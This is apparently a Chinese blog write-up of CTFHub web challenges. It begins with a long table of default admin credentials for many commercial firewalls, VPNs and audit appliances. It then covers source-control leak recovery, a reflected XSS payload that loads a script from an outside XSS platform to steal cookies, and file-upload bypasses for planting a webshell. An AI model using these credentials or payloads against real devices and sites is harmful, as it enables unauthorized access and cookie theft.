<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">常见网络安全设备弱口令(默认口令)</span><br><span class="line">设备    默认账号    默认密码</span><br><span class="line">深信服产品    sangfor    sangfor sangfor@<span class="number">2018</span> sangfor@<span class="number">2019</span></span><br><span class="line">深信服科技 AD        dlanrecover</span><br><span class="line">深信服负载均衡 AD <span class="number">3.6</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服WAC ( WNS V2<span class="number">.6</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服VPN    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">深信服ipsec-VPN (SSL <span class="number">5.5</span>)    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">深信服AC6<span class="number">.0</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">SANGFOR防火墙    <span class="keyword">admin</span>    sangfor</span><br><span class="line">深信服AF(NGAF V2<span class="number">.2</span>)    <span class="keyword">admin</span>    sangfor</span><br><span class="line">深信服NGAF下一代应用防火墙(NGAF V4<span class="number">.3</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服AD3<span class="number">.9</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服上网行为管理设备数据中心    <span class="keyword">Admin</span>    密码为空</span><br><span class="line">SANGFOR_AD_v5<span class="number">.1</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">网御漏洞扫描系统    leadsec    leadsec</span><br><span class="line">天阗入侵检测与管理系统 V7<span class="number">.0</span>    <span class="keyword">Admin</span>    venus70</span><br><span class="line">Audit    venus70</span><br><span class="line">adm    venus70</span><br><span class="line">天阗入侵检测与管理系统 V6<span class="number">.0</span>    <span class="keyword">Admin</span>    venus60</span><br><span class="line">Audit    venus60</span><br><span class="line">adm    venus60</span><br><span class="line">网御WAF集中控制中心(V3<span class="number">.0</span>R5<span class="number">.0</span>)    <span class="keyword">admin</span>    leadsec.waf</span><br><span class="line">audit    leadsec.waf</span><br><span class="line">adm    leadsec.waf</span><br><span class="line">联想网御    administrator    administrator</span><br><span class="line">网御事件服务器    <span class="keyword">admin</span>    admin123</span><br><span class="line">联想网御防火墙PowerV    administrator    administrator</span><br><span class="line">联想网御入侵检测系统    lenovo    <span class="keyword">default</span></span><br><span class="line">网络卫士入侵检测系统    <span class="keyword">admin</span>    talent</span><br><span class="line">网御入侵检测系统V3<span class="number">.2</span><span class="number">.72</span><span class="number">.0</span>    adm    leadsec32</span><br><span class="line"><span class="keyword">admin</span>    leadsec32</span><br><span class="line">联想网御入侵检测系统IDS    root    <span class="number">111111</span></span><br><span class="line"><span class="keyword">admin</span>    admin123</span><br><span class="line">科来网络回溯分析系统    csadmin    colasoft</span><br><span class="line">中控考勤机web3<span class="number">.0</span>    administrator    <span class="number">123456</span></span><br><span class="line">H3C iMC    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C SecPath系列    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C S5120-SI    test    <span class="number">123</span></span><br><span class="line">H3C智能管理中心    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C ER3100    <span class="keyword">admin</span>    adminer3100</span><br><span class="line">H3C ER3200    <span class="keyword">admin</span>    adminer3200</span><br><span class="line">H3C ER3260    <span class="keyword">admin</span>    adminer3260</span><br><span class="line">H3C    <span class="keyword">admin</span>    adminer</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    h3capadmin</span><br><span class="line">h3c    h3c</span><br><span class="line"><span class="number">360</span>天擎    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">网神防火墙    firewall    firewall</span><br><span class="line">天融信防火墙NGFW4000    superman    talent</span><br><span class="line">黑盾防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">rule</span>    abc123</span><br><span class="line">audit    abc123</span><br><span class="line">华为防火墙    telnetuser    telnetpwd</span><br><span class="line">ftpuser    ftppwd</span><br><span class="line">方正防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">飞塔防火墙    <span class="keyword">admin</span>    密码为空</span><br><span class="line">Juniper_SSG__5防火墙    netscreen    netscreen</span><br><span class="line">中新金盾硬件防火墙    <span class="keyword">admin</span>    <span class="number">123</span></span><br><span class="line">kill防火墙(冠群金辰)    <span class="keyword">admin</span>    sys123</span><br><span class="line">天清汉马USG防火墙    <span class="keyword">admin</span>    venus.fw</span><br><span class="line">Audit    venus.audit</span><br><span class="line">useradmin    venus.<span class="keyword">user</span></span><br><span class="line">阿姆瑞特防火墙    <span class="keyword">admin</span>    manager</span><br><span class="line">山石网科    hillstone    hillstone</span><br><span class="line">绿盟安全审计系统    weboper    weboper</span><br><span class="line">webaudit    webaudit</span><br><span class="line">conadmin    conadmin</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">shell    shell</span><br><span class="line">绿盟产品        nsfocus123</span><br><span class="line">TopAudit日志审计系统    superman    talent</span><br><span class="line">LogBase日志管理综合审计系统    <span class="keyword">admin</span>    safetybase</span><br><span class="line">网神SecFox运维安全管理与审计系统    <span class="keyword">admin</span>    !<span class="number">1</span>fw@<span class="number">2</span>soc#<span class="number">3</span>vpn</span><br><span class="line">天融信数据库审计系统    superman    telent</span><br><span class="line">Hillstone安全审计平台    hillstone    hillstone</span><br><span class="line">网康日志中心    ns25000    ns25000</span><br><span class="line">网络安全审计系统（中科新业）    <span class="keyword">admin</span>    <span class="number">123456</span></span><br><span class="line">天玥网络安全审计系统    <span class="keyword">Admin</span>    cyberaudit</span><br><span class="line">明御WEB应用防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    adminadmin</span><br><span class="line">明御攻防实验室平台    root    <span class="number">123456</span></span><br><span class="line">明御安全网关    <span class="keyword">admin</span>    adminadmin</span><br><span class="line">明御运维审计与册风险控制系统    <span class="keyword">admin</span>    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">system</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">auditor    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">operator</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">明御网站卫士    sysmanager    sysmanager888</span><br><span class="line">亿邮邮件网关    eyouuser    eyou_admin</span><br><span class="line">eyougw    <span class="keyword">admin</span>@(eyou)</span><br><span class="line"><span class="keyword">admin</span>    +-ccccc</span><br><span class="line"><span class="keyword">admin</span>    cyouadmin</span><br><span class="line">Websense邮件安全网关    administrator    <span class="keyword">admin</span></span><br><span class="line">梭子鱼邮件存储网关    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>

<h2 id="2-信息泄露-备份文件下载"><a href="#2-信息泄露-备份文件下载" class="headerlink" title="2.信息泄露-备份文件下载"></a>2.信息泄露-备份文件下载</h2><p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220919213733369.png"><img src="/wp-CTFHub/image-20220919213733369.png" alt="image-20220919213733369"></a></p>
<h2 id="2-1-信息泄露-robots-txt"><a href="#2-1-信息泄露-robots-txt" class="headerlink" title="2.1 信息泄露-robots.txt"></a>2.1 信息泄露-robots.txt</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">访问url/robots.txt</span><br></pre></td></tr></table></figure>

<p>查看爬虫协议</p>
<h2 id="2-2-信息泄露-bak文件"><a href="#2-2-信息泄露-bak文件" class="headerlink" title="2.2 信息泄露-bak文件"></a>2.2 信息泄露-bak文件</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">访问url/文件名.后缀名<span class="string">.bak</span></span><br></pre></td></tr></table></figure>

<p>下载bak（备份文件）</p>
<h2 id="2-3-信息泄露-vim缓存"><a href="#2-3-信息泄露-vim缓存" class="headerlink" title="2.3 信息泄露-vim缓存"></a>2.3 信息泄露-vim缓存</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在使用<code>vim</code>时会创建临时缓存文件，关闭<code>vim</code>时缓存文件则会被删除，当<code>vim</code>异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 <code>index.php</code> 为例：<br><strong>第一次</strong>产生的交换文件名为 <code>.index.php.swp</code></p>
<p><strong>再次意外退出</strong>后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
<p><strong>第三次产生</strong>的交换文件则为 <code>.index.php.swn</code><br>作用</p>
<p><u>可用来恢复意外退出的文件</u></p>
<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p><code>SWP</code>文件为隐藏文件，操作时需要在文件名前加.</p>
<p>针对<code>SWP</code>备份文件，我们可以使用<code>vim -r filename</code>命令来恢复文件<br>(<code>vim</code>使用的缓存存储为一种固定格式的二进制文件。而我们一般编辑的时明问可见字符，在vim的缓存中这些可见字符会原样保留,所以显示是一种乱码)<br>根据提示按回车进行恢复</p>
<h2 id="2-4-信息泄露-DS-Store"><a href="#2-4-信息泄露-DS-Store" class="headerlink" title="2.4 信息泄露-.DS_Store"></a>2.4 信息泄露-.DS_Store</h2><blockquote>
<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">访问url/.DS_Store</span><br></pre></td></tr></table></figure>

<p>下载<code>DS_Store</code>文件</p>
<h2 id="3-信息泄露-Git泄露-log"><a href="#3-信息泄露-Git泄露-log" class="headerlink" title="3.信息泄露-Git泄露-log"></a>3.信息泄露-Git泄露-log</h2><p> 第一次使用<strong>githack</strong>，记录一下</p>
<p><strong>注意githack需要python2.7版本</strong></p>
<p><code>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</code></p>
<p><code>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</code></p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>1、解析<code>.git/index</code>文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去<code>.git/objects/</code> 文件夹下下载对应的文件<br>3、<code>zlib</code>解压文件，按原始的目录结构写入源代码</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令，<code>all you need is python</code><br>脚本无需浏览目录</p>
<h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>注意这里在url后面需要加上.git，用dirsearch可以扫出来（python3）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GitHack.py http:<span class="regexp">//</span>www.openssl.org<span class="regexp">/.git/</span></span><br></pre></td></tr></table></figure>

<p>然后在目录<code>dist</code>就会生成对应目录 </p>
<p>打开目录，输入<code>cmd</code>，执行<code>git log</code>【<code>git log</code> 可以查看<code>commit history</code>，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220728230330073.png"><img src="/wp-CTFHub/image-20220728230330073.png" alt="image-20220728230330073"></a></p>
<p>然后复制<code>add flag</code>这个命令的代码，如上图<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
<p>然后用<code>git diff</code></p>
<p>【</p>
<p>git diff比较两个版本的差异，</p>
<p>这里后面只有<strong>一个命令</strong>就是比较本地工作区和缓存区的信息区别</p>
<p>如果后面有<strong>两个命令</strong>，就是比较这两个命令的差别</p>
<p>】</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220728231134513.png"><img src="/wp-CTFHub/image-20220728231134513.png" alt="image-20220728231134513"></a></p>
<p>这里比较，就得到了<code>flag</code></p>
<h2 id="4-信息泄露-Git泄露-Stash"><a href="#4-信息泄露-Git泄露-Stash" class="headerlink" title="4.信息泄露-Git泄露-Stash"></a>4.信息泄露-Git泄露-Stash</h2><h3 id="git-stash-的作用"><a href="#git-stash-的作用" class="headerlink" title="git stash 的作用"></a>git stash 的作用</h3><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>
<p>通过git stash存储的修改列表,可以通过<u><strong>git stash list</strong></u>查看.<u><strong>git stash show</strong></u>用于校验,<u><strong>git stash apply</strong></u>用于重新存储.直接执行<u><code>git stash</code>等同于<code>git stash save.</code></u></p>
<p>最新的存储保存在<code>refs/stash</code>中老的存储可以通过相关的参数获得,例如<code>stash@&#123;0&#125;</code>获取最新的存储,stash@{1}获取次新<code>.stash@&#123;2.hour.ago&#125;</code>获取两小时之前的.存储可以直接通过索引的位置来获得<code>stash@&#123;n&#125;</code>.</p>
<p>操作同<code>2.log</code></p>
<p>可以先用<code>dirsearch</code>扫一下， 发现<code>refs/stash</code>文件，</p>
<p>然后用<code>GitHack</code>扫描</p>
<p>在生成文件夹里有<code>stash</code>文件</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">`D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs`</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220729115457869.png"><img src="/wp-CTFHub/image-20220729115457869.png" alt="image-20220729115457869"></a></p>
<p>打开看到</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220729115528299.png"><img src="/wp-CTFHub/image-20220729115528299.png" alt="image-20220729115528299"></a></p>
<p>在生成的文件夹下用</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">git diff d8c1978b1e71300574e1bb5335a01<span class="number">124b3a55569</span></span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p>【也可以使用 <code>git bash</code>，直接在生成的文件夹下</p>
<p>执行<code>git stash list</code> </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">查看stash了哪些存储</span><br></pre></td></tr></table></figure>

<p>然后执行<code>git stash pop</code></p>
<pre><code>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，
并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，

如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，
比如应用并删除第二个：git stash pop stash@&#123;1&#125;）
</code></pre>
<p>然后会在该目录下生成一个新的<code>txt</code>文件，打开或用<code>cat</code>命令，得到<code>flag</code></p>
<p>】</p>
<h2 id="5-信息泄露-SVN泄露"><a href="#5-信息泄露-SVN泄露" class="headerlink" title="5.信息泄露-SVN泄露"></a>5.信息泄露-SVN泄露</h2><p><code>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</code></p>
<p>这道题需要运用<code>dvcs-ripper</code>工具进行处理</p>
<p>可以先用<code>dirsearch</code>扫出<code>.svn</code>目录，说明有<code>SVN</code>泄露</p>
<p>和<code>githack</code>类似，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-svn.pl -v -u url/.svn</span><br></pre></td></tr></table></figure>

<p>然后在dvcs-ripper目录里，进入.svn目录</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220729175208298.png"><img src="/wp-CTFHub/image-20220729175208298.png" alt="image-20220729175208298"></a></p>
<p>然后进入pristine目录，进去发现两个目录，挨个打开</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220729175252045.png"><img src="/wp-CTFHub/image-20220729175252045.png" alt="image-20220729175252045"></a></p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220729175429878.png"><img src="/wp-CTFHub/image-20220729175429878.png" alt="image-20220729175429878"></a></p>
<p>发现一个目录下是网站页面源码，另一个就是<code>flag</code></p>
<p>得到<code>flag</code></p>
<h2 id="6-信息泄露-HG泄露"><a href="#6-信息泄露-HG泄露" class="headerlink" title="6.信息泄露-HG泄露"></a>6.信息泄露-HG泄露</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="string">`当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。`</span></span><br></pre></td></tr></table></figure>

<p>可以先用<code>dirsearch</code>扫出<code>.hg</code>目录，说明有<code>HG</code>泄露</p>
<p>这个和<code>SVN</code>一样，只不过要改成<code>.hg</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-hg.pl -v -u url/.hg</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220730164340016.png"><img src="/wp-CTFHub/image-20220730164340016.png" alt="image-20220730164340016"></a></p>
<p>发现两个文件，猜测为<code>HG</code>泄露文件</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220730164428184.png"><img src="/wp-CTFHub/image-20220730164428184.png" alt="image-20220730164428184"></a></p>
<p>发现<code>flag</code>文本文件</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220730164949862.png"><img src="/wp-CTFHub/image-20220730164949862.png" alt="image-20220730164949862"></a></p>
<p><code>url+flag_973127138.txt</code></p>
<p>得到<code>flag</code></p>
<h2 id="7-xss-xss反射型"><a href="#7-xss-xss反射型" class="headerlink" title="7.xss-xss反射型"></a>7.xss-xss反射型</h2><p>发现它有两个输入框</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731104635854.png"><img src="/wp-CTFHub/image-20220731104635854.png" alt="image-20220731104635854"></a></p>
<p>第一个输入测试语句，成功弹窗</p>
<p>第二个是发送<code>url</code>，盲猜是发到后台</p>
<p>看了一些<code>wp</code>，发现需要使用<code>xss</code>测试平台<code>http://xsscom.com//index.php</code></p>
<p>先创建项目</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731113619175.png"><img src="/wp-CTFHub/image-20220731113619175.png" alt="image-20220731113619175"></a></p>
<p>设置配置</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731113753893.png"><img src="/wp-CTFHub/image-20220731113753893.png" alt="image-20220731113753893"></a></p>
<p>然后点击查看代码</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731113810045.png"><img src="/wp-CTFHub/image-20220731113810045.png" alt="image-20220731113810045"></a></p>
<p>在最下面看到</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731113837566.png"><img src="/wp-CTFHub/image-20220731113837566.png" alt="image-20220731113837566"></a></p>
<p>把代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xsscom.com//9VJcMV</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>输入到第一个框中</p>
<p>再把提交后的url复制，然后到第二框中发送</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731114028909.png"><img src="/wp-CTFHub/image-20220731114028909.png" alt="image-20220731114028909"></a></p>
<p>然后返回xss测试平台上查看</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731114142138.png"><img src="/wp-CTFHub/image-20220731114142138.png" alt="image-20220731114142138"></a></p>
<p><code>cookie</code>处出现<code>flag</code></p>
<h2 id="8-文件上传-文件头检查"><a href="#8-文件上传-文件头检查" class="headerlink" title="8.文件上传-文件头检查"></a>8.文件上传-文件头检查</h2><p><code>文件头是直接位于文件中的一段数据,是文件的一部分</code></p>
<p>这里过滤文件头，而且限制图片类型文件，所以可以试试上传一个没有任何问题的图片【注意图片不能太大，不然会最后用蚁剑连接会爆错，我上传1mb大小图片就报错，最后上传400字节图片才成功】</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731164210465.png"><img src="/wp-CTFHub/image-20220731164210465.png" alt="image-20220731164210465"></a></p>
<p>上传图片后，在后面加上一句话木马，并修改文件名</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">【也可以用<span class="keyword">cmd</span><span class="language-bash"> 合成图片马，也是有图片文件头】</span></span><br><span class="line"></span><br><span class="line">【<span class="keyword">copy</span><span class="language-bash"> 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】</span></span><br><span class="line"></span><br><span class="line">【已试可行】</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731164732820.png"><img src="/wp-CTFHub/image-20220731164732820.png" alt="image-20220731164732820"></a></p>
<p>然后正常用蚁剑连接</p>
<p><a data-fancybox="gallery" data-src="/wp-CTFHub/image-20220731164330254.png"><img src="/wp-CTFHub/image-20220731164330254.png" alt="image-20220731164330254"></a></p>
<p>得到<code>flag</code></p>
<h2 id="9-文件上传-00截断"><a href="#9-文件上传-00截断" class="headerlink" title="9.文件上传-00截断"></a>9.文件上传-00截断</h2><h3 id="0x00截断原理：-php"><a href="#0x00截断原理：-php" class="headerlink" title="0x00截断原理：[php&lt;5.3.29]"></a>0x00截断原理：[php&lt;5.3.29]</h3><figure class="highlight cos"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x00是十六进制表示方法，是<span class="keyword">ascii</span>码为<span class="number">0</span>的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到<span class="number">0</span>x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。</span><br><span class="line"></span><br><span class="line">但要注意是文件的<span class="number">16</span>进制内容里的<span class="number">00</span>，而不是文件名中的<span class="number">00</span> ！！！就是说系统是按<span class="number">16</span>进制读取文件（或者说二进制），</span><br><span class="line"></span><br><span class="line">遇到<span class="keyword">ascii</span>码为零的位置就停止，而这个<span class="keyword">ascii</span>码为零的位置在<span class="number">16</span>进制中是<span class="number">00</span>，用<span class="number">0</span><span class="keyword">x</span>开头表示<span class="number">16</span>进制，也就是所说的<span class="number">0</span>x00截断。</span><br><span class="line"></span><br><span class="line">%<span class="number">00</span>是被服务器解码为<span class="number">0</span>x00发挥了截断作用。</span><br></pre></td></tr></table></figure>

<p><code>举个例子，url中输入的是upload/post.php%00.png，看样子是图片文件，那么后台读取到是upload/post.php，就实现了绕后目的。</code></p>
<p>我们开始先上传一个文件试试，限制<code>jpg,png,gif</code>后缀</p>
<p>上传成功后，没有显示上传路径，只是url变化</p>
<p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>
<p> 猜想多半重新临时文件名，不固定，导致显示不了路径</p>
<p>这里就需要<code>00截断</code>，要把文件上传的路径，找到，好用蚁剑连接</p>
<p>先要清楚<code>%00</code>截断点在哪里，我们先F12看</p>
<p>看网站源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;文件类型不匹配&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现里面有一串代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>这个函数就是把上传文件放到<code>$des</code>的路径上并且改了文件名</p>
